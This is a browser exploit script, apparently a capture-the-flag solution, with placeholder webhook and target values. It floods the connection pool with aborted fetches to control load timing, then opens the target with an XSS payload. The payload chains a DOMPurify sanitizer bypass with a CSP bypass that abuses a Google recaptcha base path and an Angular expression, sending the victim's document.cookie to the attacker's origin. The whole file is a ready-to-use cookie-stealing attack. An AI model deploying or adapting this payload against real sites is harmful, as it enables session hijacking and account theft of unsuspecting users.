<script>
    const WEBHOOK = "{{ domain }}"
    const PORT = "{{ port }}"
    const TARGET = "{{ target }}"

    async function fetchResourceTime(url) {
        const startTime = performance.now();

        try {
            const response = await fetch(url);
            const endTime = performance.now();

            const duration = endTime - startTime;
            console.log(`Fetched ${url} in ${duration.toFixed(2)} ms with status ${response.status}`);

            // Return an object with the duration and status code
            return { duration: duration.toFixed(2), status: response.status };
        } catch (error) {
            const endTime = performance.now();

            const duration = endTime - startTime;
            console.error(`Failed to fetch ${url}:`, error);

            // Return an object with the duration and error message
            return { duration: duration.toFixed(2), error: error.message };
        }
    }



    const sleep = (s)=> new Promise((res)=>setTimeout(res, s))

    window.controllers = [];
    window.releaseConn = () => {
        console.assert(window.controllers.length > 0);
        window.controllers.shift().abort();
    }
    window.cnt = 0;
    window.addConn = () => {
        const controller = new AbortController();
        const signal = controller.signal;
        fetch(`http://${cnt}.${WEBHOOK}:${PORT}/zzz`, { signal });
        window.controllers.push(controller);
        window.cnt++;
    }
    async function main(){
        // cache it first
        let DOMPurifyLoadTime = await fetchResourceTime("https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.1.2/purify.min.js");
        await fetch("?time="+DOMPurifyLoadTime.duration)
        // the load time will be stable after the first load because it's cached
        DOMPurifyLoadTime = await fetchResourceTime("https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.1.2/purify.min.js");
        await fetch("?time="+DOMPurifyLoadTime.duration)
        for (let i = 0; i < 256; i++) {
            addConn();
        }
        await sleep(1000)
        // google ctf 2023 csp bypass payload + some xhtml dompurify bypass from ImaginaryCTF 2023
        let w = open(TARGET+"?html="+encodeURIComponent(`a<style><![CDATA[</style><div data-x="]]></style><iframe name='Page' />

<base href='https://www.google.com/recaptcha/about/js/'></base>

<div ng-controller='CarouselController as c' ng-init='c.init()'>
    [[d=c.element.ownerDocument.defaultView.parent;d.location='${origin}?'+d.document.cookie]]
    <div carousel=''>
        <div slides=''></div>
    </div>
</div>

<style><!--"></div><style>--></style></div>
`))
        releaseConn() // release the conn first so the target page can load
        // because the load on target server will be so fast because the cache so we use 1ms~2ms sleep
        await sleep(DOMPurifyLoadTime.duration) // waiting for page to load and load dompurify
        addConn() // probably will stop in bootstrap.min.css or bootstrap.bundle.min.js.
        await sleep(1000) //Wait for setTimeout to finished
        releaseConn() // probably we will sucessfully set the base tag before the ./main.min.js get loaded
    }
    main()
</script>
